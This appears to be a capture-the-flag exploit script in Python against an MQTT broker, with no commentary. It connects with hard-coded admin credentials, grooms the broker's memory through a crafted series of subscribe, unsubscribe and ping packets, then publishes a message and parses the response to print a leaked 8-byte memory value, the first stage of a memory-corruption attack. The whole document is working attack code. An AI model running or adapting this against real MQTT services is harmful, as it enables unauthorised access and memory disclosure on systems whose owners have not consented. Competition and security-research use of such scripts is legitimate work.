import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
def varint(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def sstr(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pkt(t,body,forced=None): return bytes([t])+varint(len(body) if forced is None else forced)+body
s=socket.create_connection((HOST,PORT),8); s.settimeout(2)
def tx(b): s.sendall(b)
def rx(t=0.4):
    s.settimeout(t); out=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            out+=d
    except Exception: pass
    return out
body=sstr('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+sstr('QWB_Client')+sstr('QWB2026_Admin')+sstr('hn5ne')
tx(pkt(0x10,body)); time.sleep(1.0); a=rx(1.2); print('auth',a.hex())
assert b'\x20\x02\x00\x00' in a, 'authfail'
def sub(t):
    tx(pkt(0x82,struct.pack('>H',1)+sstr(t))); time.sleep(0.35); return rx(0.8)
def unsub(t):
    tx(pkt(0xA2,struct.pack('>H',1)+sstr(t))); time.sleep(0.35); return rx(0.8)
for t in ['d1zz','d2zz','d3zz']: sub(t)
A=b'A'*30; B=b'B'*30
sub(A); sub(B); sub('QWB2026_News')
unsub(A); unsub(B)
for i in range(6):
    tx(b'\xc0\x00'); time.sleep(0.25); rx(0.5)
D=b'C'*30
tx(pkt(0x30, sstr('QWB2026_News')+D)); time.sleep(0.8)
o=rx(1.5)
print('resp',o.hex())
if len(o)>2 and o[0]==0x34:
    rl=o[1]; body=o[2:2+rl]
    tl=struct.unpack('>H',body[0:2])[0]
    rest=body[2+tl:]
    msgid=rest[0:2]; payload=rest[2:]
    print('payload len',len(payload),payload.hex())
    if len(payload)>=8:
        print('leak qword =',hex(struct.unpack('>Q',payload[:8])[0]))
